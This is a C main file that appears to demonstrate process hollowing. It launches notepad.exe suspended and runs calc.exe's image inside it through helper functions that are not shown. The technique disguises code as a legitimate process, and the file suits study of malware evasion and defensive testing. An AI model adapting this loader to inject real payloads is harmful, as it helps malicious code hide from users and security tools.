#include "ProcessHollowing.h"

#define TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"

int main()
{

	HANDLE ProcessHandle = NULL;
	HANDLE ThreadHandle = NULL;
	LPVOID TargetPayloadBuffer = NULL;

	if (!CreateSuspendedProcess(TARGET_PROCESS, &ProcessHandle, &ThreadHandle))
	{
		PRINT_ERROR("CreateSuspendedProcess");
		return 1;
	}

	if (!ReadTargetFileW(L"C:\\Windows\\System32\\calc.exe", &TargetPayloadBuffer))
	{
		PRINT_ERROR("ReadTargetFileW");
		return 1;
	}

	if (!PerformHollowExecution(ProcessHandle, ThreadHandle, TargetPayloadBuffer))
	{
		PRINT_ERROR("PerformHollowExecution");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}